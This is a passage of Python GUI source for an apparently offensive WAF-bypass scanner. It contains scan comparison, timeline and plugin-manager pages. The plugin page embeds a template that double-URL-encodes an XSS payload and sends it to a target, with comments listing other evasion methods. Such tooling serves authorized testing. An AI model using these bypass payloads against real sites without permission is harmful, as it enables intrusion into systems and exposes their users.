        def _show_compare_scans_dialog(self):
            """Show dialog to compare two scans."""
            try:
                dlg = QtWidgets.QDialog(self)
                dlg.setWindowTitle(_t('compare_scans', self._lang) if 'compare_scans' in TRANSLATIONS.get(self._lang, {}) else '🔍 Compare Scans')
                dlg.resize(800, 600)
                dlg.setStyleSheet("""
                    QDialog { background-color: #0f1112; }
                    QLabel { color: #d7e1ea; }
                    QComboBox { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; padding: 5px; min-width: 300px; }
                    QGroupBox { color: #d7e1ea; border: 1px solid #2b2f33; margin-top: 10px; padding-top: 10px; }
                    QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
                    QListWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                    QListWidget::item { padding: 5px; }
                """)
                
                layout = QVBoxLayout(dlg)
                
                header = QLabel('🔍 ' + (_t('compare_scans', self._lang) if 'compare_scans' in TRANSLATIONS.get(self._lang, {}) else 'Compare Scans'))
                header.setFont(QFont('', 14, QFont.Bold))
                header.setStyleSheet('color: #58a6ff;')
                layout.addWidget(header)
                
                # Scan selection
                select_layout = QHBoxLayout()
                
                scan1_combo = QtWidgets.QComboBox()
                scan2_combo = QtWidgets.QComboBox()
                
                # Populate combos with scan history
                if self._db:
                    scans = self._db.get_scan_history(limit=50)
                    for scan in scans:
                        label = f"{scan.get('scan_id', 'N/A')[:8]}... - {scan.get('started_at', 'N/A')} ({scan.get('total_findings', 0)} findings)"
                        scan1_combo.addItem(label, scan.get('scan_id'))
                        scan2_combo.addItem(label, scan.get('scan_id'))
                
                if scan2_combo.count() > 1:
                    scan2_combo.setCurrentIndex(1)
                
                select_layout.addWidget(QLabel('Scan 1:'))
                select_layout.addWidget(scan1_combo)
                select_layout.addWidget(QLabel('Scan 2:'))
                select_layout.addWidget(scan2_combo)
                
                layout.addLayout(select_layout)
                
                # Results area
                results_layout = QHBoxLayout()
                
                # New findings
                new_group = QtWidgets.QGroupBox(_t('new_findings', self._lang) if 'new_findings' in TRANSLATIONS.get(self._lang, {}) else '🆕 New Findings')
                new_layout = QVBoxLayout(new_group)
                new_list = QtWidgets.QListWidget()
                new_layout.addWidget(new_list)
                results_layout.addWidget(new_group)
                
                # Fixed findings
                fixed_group = QtWidgets.QGroupBox(_t('fixed_findings', self._lang) if 'fixed_findings' in TRANSLATIONS.get(self._lang, {}) else '✅ Fixed Findings')
                fixed_layout = QVBoxLayout(fixed_group)
                fixed_list = QtWidgets.QListWidget()
                fixed_layout.addWidget(fixed_list)
                results_layout.addWidget(fixed_group)
                
                layout.addLayout(results_layout, 1)
                
                # Summary label
                summary_label = QLabel('')
                summary_label.setStyleSheet('color: #8b949e; padding: 10px;')
                layout.addWidget(summary_label)
                
                def do_compare():
                    new_list.clear()
                    fixed_list.clear()
                    
                    if not self._db or scan1_combo.count() == 0:
                        return
                    
                    scan_id_1 = scan1_combo.currentData()
                    scan_id_2 = scan2_combo.currentData()
                    
                    if not scan_id_1 or not scan_id_2:
                        return
                    
                    comparison = self._db.compare_scans(scan_id_1, scan_id_2)
                    
                    # Populate new findings
                    for f in comparison.get('new', []):
                        item = QtWidgets.QListWidgetItem(f"🔴 [{f.get('severity', 'INFO')}] {f.get('technique', 'Unknown')} - {f.get('target', 'N/A')}")
                        new_list.addItem(item)
                    
                    if not comparison.get('new'):
                        new_list.addItem(QtWidgets.QListWidgetItem('No new findings'))
                    
                    # Populate fixed findings
                    for f in comparison.get('fixed', []):
                        item = QtWidgets.QListWidgetItem(f"✅ [{f.get('severity', 'INFO')}] {f.get('technique', 'Unknown')} - {f.get('target', 'N/A')}")
                        fixed_list.addItem(item)
                    
                    if not comparison.get('fixed'):
                        fixed_list.addItem(QtWidgets.QListWidgetItem('No fixed findings'))
                    
                    # Update summary
                    unchanged = _t('unchanged', self._lang) if 'unchanged' in TRANSLATIONS.get(self._lang, {}) else 'Unchanged'
                    summary_label.setText(
                        f"📊 New: {len(comparison.get('new', []))} | Fixed: {len(comparison.get('fixed', []))} | {unchanged}: {comparison.get('unchanged_count', 0)}"
                    )
                
                compare_btn = QPushButton('🔍 Compare')
                compare_btn.setStyleSheet('QPushButton { background-color: #3b82f6; color: white; padding: 8px 16px; } QPushButton:hover { background-color: #2563eb; }')
                compare_btn.clicked.connect(do_compare)
                layout.addWidget(compare_btn)
                
                close_btn = QPushButton(_t('close', self._lang))
                close_btn.clicked.connect(dlg.accept)
                layout.addWidget(close_btn)
                
                dlg.exec()
            except Exception as e:
                QMessageBox.critical(self, 'Compare Error', str(e))

        # ==================== TIMELINE VIEWER ====================
        def _build_timeline_page(self):
            """Scan history timeline as an in-place page (rebuilt fresh per visit)."""
            from PySide6.QtCore import Qt
            from PySide6.QtGui import QFontDatabase
            
            try:
                # Find a font that supports Unicode (Arabic, Cyrillic, etc.)
                try:
                    families = set(QFontDatabase.families())
                except Exception:
                    try:
                        families = set(QFontDatabase().families())
                    except Exception:
                        families = set()
                
                unicode_fonts = ["Segoe UI", "Arial", "Noto Sans", "Tahoma", "Microsoft Sans Serif", "DejaVu Sans"]
                selected_font = next((f for f in unicode_fonts if f in families), "")
                
                dlg = QtWidgets.QWidget()
                dlg.setObjectName('TimelinePage')
                dlg.setStyleSheet(f"""
                    QWidget#TimelinePage {{ background-color: #0f1112; font-family: '{selected_font}'; }}
                    QLabel {{ color: #d7e1ea; font-family: '{selected_font}'; }}
                    QGroupBox {{ color: #d7e1ea; border: 1px solid #2b2f33; margin-top: 10px; padding-top: 10px; font-family: '{selected_font}'; }}
                    QGroupBox::title {{ subcontrol-origin: margin; left: 10px; padding: 0 5px; }}
                    QTableWidget {{ background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; gridline-color: #2b2f33; font-family: '{selected_font}'; }}
                    QTableWidget::item {{ padding: 5px; }}
                    QTableWidget::item:selected {{ background-color: #3b82f6; }}
                    QHeaderView::section {{ background-color: #1c1f21; color: #d7e1ea; padding: 8px; border: none; border-bottom: 1px solid #2b2f33; font-family: '{selected_font}'; }}
                    QComboBox {{ background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; padding: 5px; min-width: 200px; font-family: '{selected_font}'; }}
                    QPushButton {{ font-family: '{selected_font}'; }}
                    QTextEdit {{ font-family: '{selected_font}'; }}
                """)
                
                layout = QVBoxLayout(dlg)
                
                # Header
                header = QLabel('📅 ' + (_t('timeline_viewer', self._lang) if 'timeline_viewer' in TRANSLATIONS.get(self._lang, {}) else 'Scan History Timeline'))
                header.setFont(QFont('', 16, QFont.Bold))
                header.setStyleSheet('color: #58a6ff;')
                layout.addWidget(header)
                
                # Filter controls
                filter_layout = QHBoxLayout()
                
                filter_layout.addWidget(QLabel('Filter by Target:'))
                target_filter = QtWidgets.QComboBox()
                target_filter.addItem('All Targets', None)
                
                # Populate with unique targets from scan history
                if self._db:
                    scans = self._db.get_scan_history(limit=100)
                    targets_seen = set()
                    for scan in scans:
                        targets_str = scan.get('targets', '')
                        if targets_str:
                            try:
                                scan_targets = json.loads(targets_str) if targets_str.startswith('[') else [targets_str]
                                for t in scan_targets:
                                    if t and t not in targets_seen:
                                        targets_seen.add(t)
                                        target_filter.addItem(t[:50] + '...' if len(t) > 50 else t, t)
                            except:
                                pass
                
                filter_layout.addWidget(target_filter)
                filter_layout.addStretch()
                
                layout.addLayout(filter_layout)
                
                # Timeline table
                timeline_table = QtWidgets.QTableWidget()
                timeline_table.setColumnCount(6)
                timeline_table.setHorizontalHeaderLabels([
                    _t('timeline_date', self._lang) if 'timeline_date' in TRANSLATIONS.get(self._lang, {}) else 'Date',
                    _t('timeline_target', self._lang) if 'timeline_target' in TRANSLATIONS.get(self._lang, {}) else 'Target',
                    'WAF',
                    _t('timeline_findings', self._lang) if 'timeline_findings' in TRANSLATIONS.get(self._lang, {}) else 'Findings',
                    'Bypasses',
                    _t('status', self._lang) if 'status' in TRANSLATIONS.get(self._lang, {}) else 'Status'
                ])
                timeline_table.horizontalHeader().setStretchLastSection(True)
                timeline_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
                timeline_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
                timeline_table.setSelectionBehavior(QtWidgets.QTableWidget.SelectRows)
                timeline_table.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)
                
                def refresh_timeline(target_filter_val=None):
                    timeline_table.setRowCount(0)
                    
                    if not self._db:
                        return
                    
                    scans = self._db.get_scan_history(limit=100)
                    
                    for scan in scans:
                        targets_str = scan.get('targets', '')
                        
                        # Apply filter
                        if target_filter_val:
                            if target_filter_val not in targets_str:
                                continue
                        
                        try:
                            scan_targets = json.loads(targets_str) if targets_str.startswith('[') else [targets_str]
                        except:
                            scan_targets = [targets_str] if targets_str else []
                        
                        row = timeline_table.rowCount()
                        timeline_table.insertRow(row)
                        
                        # Date
                        date_item = QtWidgets.QTableWidgetItem(scan.get('started_at', 'N/A'))
                        timeline_table.setItem(row, 0, date_item)
                        
                        # Target(s)
                        target_text = ', '.join(scan_targets[:2]) + ('...' if len(scan_targets) > 2 else '')
                        target_item = QtWidgets.QTableWidgetItem(target_text[:60])
                        target_item.setToolTip('\\n'.join(scan_targets))
                        timeline_table.setItem(row, 1, target_item)
                        
                        # WAF
                        waf_item = QtWidgets.QTableWidgetItem(scan.get('waf_detected', 'Unknown') or 'Unknown')
                        timeline_table.setItem(row, 2, waf_item)
                        
                        # Findings
                        findings = scan.get('total_findings', 0)
                        findings_item = QtWidgets.QTableWidgetItem(str(findings))
                        if findings > 10:
                            findings_item.setForeground(QBrush(QColor('#ef4444')))
                        elif findings > 0:
                            findings_item.setForeground(QBrush(QColor('#f59e0b')))
                        timeline_table.setItem(row, 3, findings_item)
                        
                        # Bypasses
                        bypasses = scan.get('total_bypasses', 0)
                        bypasses_item = QtWidgets.QTableWidgetItem(str(bypasses))
                        if bypasses > 0:
                            bypasses_item.setForeground(QBrush(QColor('#22c55e')))
                        timeline_table.setItem(row, 4, bypasses_item)
                        
                        # Status
                        status = scan.get('status', 'unknown')
                        status_item = QtWidgets.QTableWidgetItem(status.capitalize())
                        if status == 'completed':
                            status_item.setForeground(QBrush(QColor('#22c55e')))
                        elif status == 'running':
                            status_item.setForeground(QBrush(QColor('#3b82f6')))
                        elif status == 'error':
                            status_item.setForeground(QBrush(QColor('#ef4444')))
                        timeline_table.setItem(row, 5, status_item)
                        
                        # Store scan_id in item data
                        date_item.setData(Qt.UserRole, scan.get('scan_id'))
                
                refresh_timeline()
                target_filter.currentIndexChanged.connect(lambda: refresh_timeline(target_filter.currentData()))
                
                layout.addWidget(timeline_table, 1)
                
                # Compare section
                compare_group = QtWidgets.QGroupBox(_t('before_after', self._lang) if 'before_after' in TRANSLATIONS.get(self._lang, {}) else 'Before/After Comparison')
                compare_layout = QVBoxLayout(compare_group)
                
                compare_info = QLabel('Select two rows in the timeline above, then click "Compare Selected" to see differences.')
                compare_info.setStyleSheet('color: #8b949e; font-style: italic;')
                compare_layout.addWidget(compare_info)
                
                compare_result = QTextEdit()
                compare_result.setReadOnly(True)
                compare_result.setMaximumHeight(150)
                compare_result.setStyleSheet('background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33;')
                compare_layout.addWidget(compare_result)
                
                def compare_selected():
                    selected = timeline_table.selectedItems()
                    if not selected:
                        compare_result.setText('Please select rows to compare.')
                        return
                    
                    # Get unique rows
                    rows = list(set(item.row() for item in selected))
                    if len(rows) < 2:
                        compare_result.setText('Please select at least 2 different scans to compare.')
                        return
                    
                    # Get scan IDs from first column of selected rows
                    scan_id_1 = timeline_table.item(rows[0], 0).data(Qt.UserRole)
                    scan_id_2 = timeline_table.item(rows[1], 0).data(Qt.UserRole)
                    
                    if not scan_id_1 or not scan_id_2:
                        compare_result.setText('Could not retrieve scan data.')
                        return
                    
                    comparison = self._db.compare_scans(scan_id_1, scan_id_2)
                    
                    result_text = f"📊 Comparison Results:\\n\\n"
                    result_text += f"🆕 New findings in later scan: {len(comparison.get('new', []))}\\n"
                    for f in comparison.get('new', [])[:5]:
                        result_text += f"   • [{f.get('severity', 'INFO')}] {f.get('technique', 'Unknown')}\\n"
                    if len(comparison.get('new', [])) > 5:
                        result_text += f"   ... and {len(comparison.get('new', [])) - 5} more\\n"
                    
                    result_text += f"\\n✅ Fixed findings: {len(comparison.get('fixed', []))}\\n"
                    for f in comparison.get('fixed', [])[:5]:
                        result_text += f"   • [{f.get('severity', 'INFO')}] {f.get('technique', 'Unknown')}\\n"
                    if len(comparison.get('fixed', [])) > 5:
                        result_text += f"   ... and {len(comparison.get('fixed', [])) - 5} more\\n"
                    
                    result_text += f"\\n📌 Unchanged: {comparison.get('unchanged_count', 0)}"
                    
                    compare_result.setText(result_text)
                
                compare_btn = QPushButton(_t('compare_with_previous', self._lang) if 'compare_with_previous' in TRANSLATIONS.get(self._lang, {}) else '🔍 Compare Selected')
                compare_btn.setStyleSheet('QPushButton { background-color: #3b82f6; color: white; padding: 8px 16px; } QPushButton:hover { background-color: #2563eb; }')
                compare_btn.clicked.connect(compare_selected)
                compare_layout.addWidget(compare_btn)
                
                layout.addWidget(compare_group)
                
                # Close button -> back to Scan
                close_btn = QPushButton(_t('close', self._lang))
                close_btn.clicked.connect(lambda: self._navigate('scan'))
                layout.addWidget(close_btn)

                return dlg
            except Exception as e:
                QMessageBox.critical(self, 'Timeline Error', str(e))
                return None

        # ==================== PLUGIN MANAGER ====================
        def _build_plugins_page(self):
            """Plugin manager as an in-place page (rebuilt fresh per visit)."""
            from PySide6.QtCore import Qt
            from PySide6.QtGui import QFontDatabase
            import subprocess
            import os
            import sys
            
            # Try multiple import methods
            PluginManager = None
            _get_plugins_dir = None
            try:
                from wafpierce.plugins import PluginManager, _get_plugins_dir
            except ImportError:
                try:
                    from .plugins import PluginManager, _get_plugins_dir
                except ImportError:
                    try:
                        # Add parent directory to path
                        parent_dir = os.path.dirname(os.path.abspath(__file__))
                        if parent_dir not in sys.path:
                            sys.path.insert(0, parent_dir)
                        from plugins import PluginManager, _get_plugins_dir
                    except ImportError as e:
                        QMessageBox.warning(self, 'Plugins', f'Plugin system not available: {e}')
                        return
            
            try:
                # Initialize plugin manager
                plugin_manager = PluginManager(self._db)
                
                # Find a font that supports Unicode (Arabic, Cyrillic, etc.)
                try:
                    families = set(QFontDatabase.families())
                except Exception:
                    try:
                        families = set(QFontDatabase().families())
                    except Exception:
                        families = set()
                
                unicode_fonts = ["Segoe UI", "Arial", "Noto Sans", "Tahoma", "Microsoft Sans Serif", "DejaVu Sans"]
                selected_font = next((f for f in unicode_fonts if f in families), "")
                
                dlg = QtWidgets.QWidget()
                dlg.setObjectName('PluginsPage')
                dlg.setStyleSheet(f"""
                    QWidget#PluginsPage {{ background-color: #0f1112; font-family: '{selected_font}'; }}
                    QLabel {{ color: #d7e1ea; font-family: '{selected_font}'; }}
                    QGroupBox {{ color: #d7e1ea; border: 1px solid #2b2f33; margin-top: 10px; padding-top: 10px; font-family: '{selected_font}'; }}
                    QGroupBox::title {{ subcontrol-origin: margin; left: 10px; padding: 0 5px; }}
                    QTableWidget {{ background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; gridline-color: #2b2f33; font-family: '{selected_font}'; }}
                    QTableWidget::item {{ padding: 5px; }}
                    QTableWidget::item:selected {{ background-color: #3b82f6; }}
                    QHeaderView::section {{ background-color: #1c1f21; color: #d7e1ea; padding: 8px; border: none; border-bottom: 1px solid #2b2f33; font-family: '{selected_font}'; }}
                    QTabWidget::pane {{ border: 1px solid #2b2f33; background: #0f1112; }}
                    QTabBar::tab {{ background: #16181a; color: #d7e1ea; padding: 10px 20px; border: 1px solid #2b2f33; font-family: '{selected_font}'; }}
                    QTabBar::tab:selected {{ background: #3b82f6; }}
                    QPushButton {{ font-family: '{selected_font}'; }}
                    QTextEdit {{ font-family: '{selected_font}'; }}
                """)
                
                layout = QVBoxLayout(dlg)
                
                # Header
                header = QLabel('🔌 ' + (_t('plugin_manager', self._lang) if 'plugin_manager' in TRANSLATIONS.get(self._lang, {}) else 'Plugin Manager'))
                header.setFont(QFont('', 16, QFont.Bold))
                header.setStyleSheet('color: #58a6ff;')
                layout.addWidget(header)
                
                # Tabs
                tabs = QtWidgets.QTabWidget()
                
                # === INSTALLED PLUGINS TAB ===
                installed_tab = QWidget()
                installed_layout = QVBoxLayout(installed_tab)
                
                # Plugins table
                plugins_table = QtWidgets.QTableWidget()
                plugins_table.setColumnCount(6)
                plugins_table.setHorizontalHeaderLabels([
                    _t('plugin_name', self._lang) if 'plugin_name' in TRANSLATIONS.get(self._lang, {}) else 'Name',
                    _t('plugin_version', self._lang) if 'plugin_version' in TRANSLATIONS.get(self._lang, {}) else 'Version',
                    _t('plugin_author', self._lang) if 'plugin_author' in TRANSLATIONS.get(self._lang, {}) else 'Author',
                    _t('plugin_category', self._lang) if 'plugin_category' in TRANSLATIONS.get(self._lang, {}) else 'Category',
                    _t('plugin_status', self._lang) if 'plugin_status' in TRANSLATIONS.get(self._lang, {}) else 'Status',
                    'Actions'
                ])
                plugins_table.horizontalHeader().setStretchLastSection(True)
                plugins_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
                plugins_table.setSelectionBehavior(QtWidgets.QTableWidget.SelectRows)
                plugins_table.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)
                
                def refresh_plugins():
                    plugins_table.setRowCount(0)
                    plugin_manager.load_all_plugins()
                    plugins_info = plugin_manager.get_plugin_info()
                    discovered_files = plugin_manager.get_discovered_files() if hasattr(plugin_manager, 'get_discovered_files') else []
                    load_errors = plugin_manager.get_load_errors() if hasattr(plugin_manager, 'get_load_errors') else {}
                    loaded_paths = {
                        os.path.normcase(os.path.abspath(p.get('file_path', '')))
                        for p in plugins_info if p.get('file_path')
                    }
                    
                    if not plugins_info and not discovered_files:
                        plugins_table.setRowCount(1)
                        empty_item = QtWidgets.QTableWidgetItem(_t('no_plugins', self._lang) if 'no_plugins' in TRANSLATIONS.get(self._lang, {}) else 'No plugins installed.')
                        empty_item.setForeground(QBrush(QColor('#8b949e')))
                        plugins_table.setItem(0, 0, empty_item)
                        plugins_table.setSpan(0, 0, 1, 6)
                        return
                    
                    for plugin in plugins_info:
                        row = plugins_table.rowCount()
                        plugins_table.insertRow(row)
                        
                        # Name
                        name_item = QtWidgets.QTableWidgetItem(plugin.get('name', 'Unknown'))
                        name_item.setToolTip(plugin.get('description', ''))
                        plugins_table.setItem(row, 0, name_item)
                        
                        # Version
                        plugins_table.setItem(row, 1, QtWidgets.QTableWidgetItem(plugin.get('version', '1.0.0')))
                        
                        # Author
                        plugins_table.setItem(row, 2, QtWidgets.QTableWidgetItem(plugin.get('author', 'Unknown')))
                        
                        # Category
                        plugins_table.setItem(row, 3, QtWidgets.QTableWidgetItem(plugin.get('category', 'bypass')))
                        
                        # Status
                        status_text = _t('plugin_enabled', self._lang) if plugin.get('enabled') else _t('plugin_disabled', self._lang)
                        status_item = QtWidgets.QTableWidgetItem(status_text)
                        status_item.setForeground(QBrush(QColor('#22c55e' if plugin.get('enabled') else '#ef4444')))
                        plugins_table.setItem(row, 4, status_item)
                        
                        # Actions - toggle button
                        action_widget = QWidget()
                        action_layout = QHBoxLayout(action_widget)
                        action_layout.setContentsMargins(2, 2, 2, 2)
                        
                        toggle_btn = QPushButton('🔄')
                        toggle_btn.setFixedWidth(30)
                        toggle_btn.setToolTip('Toggle Enable/Disable')
                        plugin_name = plugin.get('name')
                        toggle_btn.clicked.connect(lambda checked, n=plugin_name: toggle_plugin(n))
                        action_layout.addWidget(toggle_btn)
                        
                        del_btn = QPushButton('🗑')
                        del_btn.setFixedWidth(30)
                        del_btn.setToolTip('Uninstall')
                        del_btn.clicked.connect(lambda checked, n=plugin_name: uninstall_plugin(n))
                        action_layout.addWidget(del_btn)
                        
                        plugins_table.setCellWidget(row, 5, action_widget)

                    # Also display plugin files that exist but failed to load
                    for file_path in discovered_files:
                        norm_path = os.path.normcase(os.path.abspath(file_path))
                        if norm_path in loaded_paths:
                            continue

                        row = plugins_table.rowCount()
                        plugins_table.insertRow(row)

                        base = os.path.basename(file_path)
                        name_item = QtWidgets.QTableWidgetItem(base)
                        err = load_errors.get(file_path)
                        if err:
                            name_item.setToolTip(f"Load error: {err}\n\nPath: {file_path}")
                        else:
                            name_item.setToolTip(file_path)
                        plugins_table.setItem(row, 0, name_item)

                        plugins_table.setItem(row, 1, QtWidgets.QTableWidgetItem('-'))
                        plugins_table.setItem(row, 2, QtWidgets.QTableWidgetItem('-'))
                        plugins_table.setItem(row, 3, QtWidgets.QTableWidgetItem('local-file'))

                        status_item = QtWidgets.QTableWidgetItem('Unloaded')
                        status_item.setForeground(QBrush(QColor('#ef4444')))
                        if err:
                            status_item.setToolTip(err)
                        plugins_table.setItem(row, 4, status_item)

                        # No actions available for unloaded files
                        action_widget = QWidget()
                        action_layout = QHBoxLayout(action_widget)
                        action_layout.setContentsMargins(2, 2, 2, 2)
                        action_layout.addWidget(QLabel('—'))
                        plugins_table.setCellWidget(row, 5, action_widget)
                
                def toggle_plugin(name):
                    plugin = plugin_manager.get_plugin(name)
                    if plugin:
                        if plugin.enabled:
                            plugin_manager.disable_plugin(name)
                        else:
                            plugin_manager.enable_plugin(name)
                        refresh_plugins()
                
                def uninstall_plugin(name):
                    reply = QMessageBox.question(dlg, 'Uninstall Plugin', 
                                                 f'Are you sure you want to uninstall "{name}"?',
                                                 QMessageBox.Yes | QMessageBox.No)
                    if reply == QMessageBox.Yes:
                        plugin_manager.uninstall_plugin(name)
                        refresh_plugins()
                        self.append_log(f"[*] {_t('plugin_uninstalled', self._lang).format(name=name)}")
                
                refresh_plugins()
                installed_layout.addWidget(plugins_table, 1)
                
                # Buttons
                btn_layout = QHBoxLayout()

                try:
                    plugin_dirs_info = QLabel('Plugin folders: ' + ' | '.join(getattr(plugin_manager, 'plugins_dirs', [])))
                    plugin_dirs_info.setStyleSheet('color: #8b949e; font-size: 11px;')
                    plugin_dirs_info.setWordWrap(True)
                    installed_layout.addWidget(plugin_dirs_info)
                except Exception:
                    pass
                
                refresh_btn = QPushButton('🔄 ' + (_t('refresh_plugins', self._lang) if 'refresh_plugins' in TRANSLATIONS.get(self._lang, {}) else 'Refresh'))
                refresh_btn.clicked.connect(refresh_plugins)
                btn_layout.addWidget(refresh_btn)
                
                open_folder_btn = QPushButton('📂 ' + (_t('open_plugins_folder', self._lang) if 'open_plugins_folder' in TRANSLATIONS.get(self._lang, {}) else 'Open Plugins Folder'))
                def open_plugins_folder():
                    plugins_dir = _get_plugins_dir()
                    try:
                        if os.name == 'nt':
                            os.startfile(plugins_dir)
                        elif sys.platform == 'darwin':
                            subprocess.run(['open', plugins_dir])
                        else:
                            subprocess.run(['xdg-open', plugins_dir])
                    except Exception as e:
                        QMessageBox.warning(dlg, 'Error', f'Could not open folder: {e}')
                open_folder_btn.clicked.connect(open_plugins_folder)
                btn_layout.addWidget(open_folder_btn)
                
                btn_layout.addStretch()
                installed_layout.addLayout(btn_layout)
                
                tabs.addTab(installed_tab, _t('installed_plugins', self._lang) if 'installed_plugins' in TRANSLATIONS.get(self._lang, {}) else '📦 Installed')
                
                # === CREATE PLUGIN TAB ===
                create_tab = QWidget()
                create_layout = QVBoxLayout(create_tab)
                
                create_info = QLabel('🔧 Create Your Own Plugin\\n\\nBlackthorn plugins are Python files that inherit from the BypassPlugin base class.')
                create_info.setStyleSheet('color: #d7e1ea; padding: 10px;')
                create_layout.addWidget(create_info)

                file_row = QHBoxLayout()
                file_row.addWidget(QLabel('File name:'))
                plugin_filename_edit = QLineEdit()
                plugin_filename_edit.setPlaceholderText('my_plugin.py')
                plugin_filename_edit.setText('my_plugin.py')
                file_row.addWidget(plugin_filename_edit, 1)
                create_layout.addLayout(file_row)
                
                code_example = QTextEdit()
                code_example.setReadOnly(False)
                code_example.setStyleSheet('background-color: #16181a; color: #d7e1ea; font-family: monospace; border: 1px solid #2b2f33;')
                code_example.setPlainText('''
"""
Example Blackthorn Plugin Template
---------------------------------

This file shows how to create your own custom WAF bypass plugin.

To create your own plugin, you mainly need to change:

1. Plugin metadata (name, author, description)
2. The class name
3. The payload modification logic
4. The request method (GET, POST, headers, body, etc.)
5. The reason text returned in the result

Everything else can usually stay the same.

Rename this file to something meaningful, for example:
    my_custom_bypass.py
"""

# -----------------------------------------------------
# REQUIRED IMPORT
# All Blackthorn plugins must inherit from BypassPlugin
# -----------------------------------------------------
try:
    from wafpierce.plugins import BypassPlugin
except ImportError:
    from plugins import BypassPlugin


class DoubleEncodingBypassPlugin(BypassPlugin):
    """
    EDIT THIS CLASS NAME if you create your own plugin.

    Example:
        class MyHeaderBypass(BypassPlugin):
        class JsonBodyBypass(BypassPlugin):
        class CaseMutationBypass(BypassPlugin)
    """

    # -------------------------------------------------
    # EDIT THESE METADATA FIELDS
    # These appear in the Blackthorn plugin list/UI
    # -------------------------------------------------

    name = "Double URL Encoding Bypass"   # Change to your technique name
    version = "1.0.0"                     # Update when you modify plugin
    author = "Your Name"                  # Put your name or alias here
    description = "Attempts to bypass WAF filters using double URL encoding"

    # Plugin category helps organize plugins
    # Examples: encoding, header, injection, bypass
    category = "encoding"

    # Optional tags for searching/filtering plugins
    tags = ["encoding", "double-encoding", "obfuscation"]

    # List WAFs your technique might work against
    # You can add/remove vendors here
    compatible_wafs = ["cloudflare", "modsecurity", "f5"]

    
    def execute(self, target, session, **kwargs):
        """
        REQUIRED FUNCTION

        Every plugin MUST implement execute().

        Parameters
        ----------
        target : str
            Target URL.

        session : requests.Session
            HTTP session used to send requests.

        kwargs : dict
            Optional arguments such as custom payloads.

        Returns
        -------
        dict
            Result object describing whether the bypass worked.
        """

        # Import libraries you need for your technique
        import urllib.parse

        # -------------------------------------------------
        # EDIT THIS PAYLOAD IF NEEDED
        #
        # Users of your plugin can also override this
        # using the 'payload' argument.
        # -------------------------------------------------
        payload = kwargs.get('payload', '<script>alert(1)</script>')


        # -------------------------------------------------
        # EDIT THIS SECTION
        #
        # This is where your bypass logic happens.
        #
        # In this example we double URL encode the payload.
        #
        # You could instead:
        #   - Modify headers
        #   - Change case
        #   - Inject into JSON
        #   - Use Unicode characters
        #   - Split payloads
        # -------------------------------------------------

        # Step 1: Encode payload once
        encoded_once = urllib.parse.quote(payload)

        # Step 2: Encode again (double encoding)
        modified_payload = urllib.parse.quote(encoded_once)


        try:
            # -------------------------------------------------
            # EDIT REQUEST LOGIC IF NEEDED
            #
            # Current example sends payload as GET parameter:
            #     ?q=<payload>
            #
            # You could change this to:
            #
            # POST body:
            #     session.post(target, data={"q": modified_payload})
            #
            # Header injection:
            #     session.get(target, headers={"X-Test": modified_payload})
            #
            # JSON body:
            #     session.post(target, json={"q": modified_payload})
            # -------------------------------------------------
            resp = session.get(
                target,
                params={'q': modified_payload},
                timeout=10
            )

            # Check if WAF blocked the request
            bypassed = not self.is_blocked(resp)

            # -------------------------------------------------
            # EDIT RESULT MESSAGE
            # -------------------------------------------------
            return {
                'success': True,
                'bypass': bypassed,
                'response': resp,
                'technique': self.name,
                'reason': (
                    'Custom bypass worked!'
                    if bypassed else 'Blocked'
                ),
                'severity': 'HIGH' if bypassed else 'INFO',
                'payload': modified_payload
            }

        except Exception as e:
            # Error handling (normally does not need modification)
            return {
                'success': False,
                'bypass': False,
                'response': None,
                'technique': self.name,
                'reason': str(e),
                'severity': 'INFO'
            }


# -----------------------------------------------------
# REQUIRED PLUGIN REGISTRATION
#
# Blackthorn automatically loads plugins using this
# variable, so it must point to your plugin class.
#
# If you change the class name, update it here too.
# -----------------------------------------------------
PLUGIN_CLASS = DoubleEncodingBypassPlugin
''')
                create_layout.addWidget(code_example, 1)
                
                create_btn = QPushButton('💾 Save Plugin to Plugins Folder')
                def create_from_template():
                    plugins_dir = _get_plugins_dir()
                    filename = (plugin_filename_edit.text() or 'my_plugin.py').strip()
                    if not filename.endswith('.py'):
                        filename += '.py'
                    filename = os.path.basename(filename)

                    default_path = os.path.join(plugins_dir, filename)
                    selected_path, _ = QFileDialog.getSaveFileName(
                        dlg,
                        'Save Plugin As',
                        default_path,
                        'Python Files (*.py)'
                    )
                    if not selected_path:
                        return

                    selected_name = os.path.basename(selected_path)
                    if not selected_name.endswith('.py'):
                        selected_name += '.py'
                    new_path = os.path.join(plugins_dir, selected_name)
                    filename = selected_name

                    # Ask before overwrite.
                    if os.path.exists(new_path):
                        overwrite = QMessageBox.question(
                            dlg,
                            'Overwrite Plugin',
                            f'"{selected_name}" already exists. Overwrite it?',
                            QMessageBox.Yes | QMessageBox.No,
                            QMessageBox.No
                        )
                        if overwrite != QMessageBox.Yes:
                            return

                    base_name, ext = os.path.splitext(filename)
                    ext = ext or '.py'

                    template = code_example.toPlainText()
                    if not template.strip():
                        QMessageBox.warning(dlg, 'Missing Code', 'Plugin code cannot be empty.')
                        return

                    # Normalize trailing whitespace/newline markers from editor content.
                    template = template.rstrip()
                    while template.endswith('\\n'):
                        template = template[:-2].rstrip()

                    # Validate Python syntax before saving.
                    try:
                        compile(template, filename, 'exec')
                    except SyntaxError as se:
                        QMessageBox.critical(
                            dlg,
                            'Syntax Error',
                            f'Plugin code has a syntax error at line {getattr(se, "lineno", "?")}:\n{se.msg}'
                        )
                        return

                    # If user kept the default template values, make metadata unique so it appears distinctly in the list.
                    if 'name = "My Custom Bypass"' in template:
                        display_name = base_name.replace('_', ' ').replace('-', ' ').strip().title() or 'Custom Plugin'
                        template = template.replace('name = "My Custom Bypass"', f'name = "{display_name}"', 1)

                    if 'class MyCustomBypass(BypassPlugin):' in template and 'PLUGIN_CLASS = MyCustomBypass' in template:
                        import re
